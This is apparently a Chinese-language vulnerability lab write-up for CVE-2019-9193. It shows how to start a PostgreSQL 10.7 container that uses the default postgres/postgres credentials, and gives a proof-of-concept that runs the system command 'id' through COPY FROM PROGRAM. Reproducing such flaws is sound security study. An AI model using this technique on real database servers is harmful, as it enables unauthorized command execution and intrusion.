# PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）

PostgreSQL 是一个功能强大的开源关系型数据库系统。在9.3到11版本中存在一处"特性"，管理员或具有"COPY TO/FROM PROGRAM"权限的用户，可以使用这个特性执行任意系统命令。

参考链接：

- <https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5>

## 环境搭建

执行以下命令启动存在漏洞的 PostgreSQL 10.7 服务器：

```
docker compose up -d
```

服务器将在默认的PostgreSQL端口5432上启动并监听，默认账号密码为postgres/postgres。

## 漏洞复现

首先连接到PostgreSQL服务器，并执行以下验证概念（POC）：

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

`FROM PROGRAM`语句将执行`id`命令并将结果保存在`cmd_exec`表中：

![](1.png)
